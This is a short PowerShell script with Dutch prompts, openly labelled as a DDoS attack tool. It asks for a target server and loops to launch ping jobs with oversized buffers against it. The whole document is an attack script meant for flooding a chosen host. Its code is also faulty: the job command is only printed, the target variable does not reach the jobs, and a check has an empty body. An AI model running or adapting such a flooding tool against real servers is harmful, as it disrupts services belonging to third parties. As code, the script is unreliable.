$server = "127.0.0.1"
$aantalJobs = 10
$uitvoeren = "nee"
$uitvoeren = Read-Host "wil je dit script uitvoeren voor een DDoS attackt?"
$server = Read-Host "Welke server moet de DDoS attack heen?"

if ($uitvoeren -eq "nee"){
    exit
}

if  ($server -eq "127.0.0.1"){
    
}

for ($counter = 0; $counter -le $aantalJobs; $counter++){
    Write-Host $counter Start-Job -ScriptBlock{test-Connection -ComputerName $server -BufferSize 48046}
}


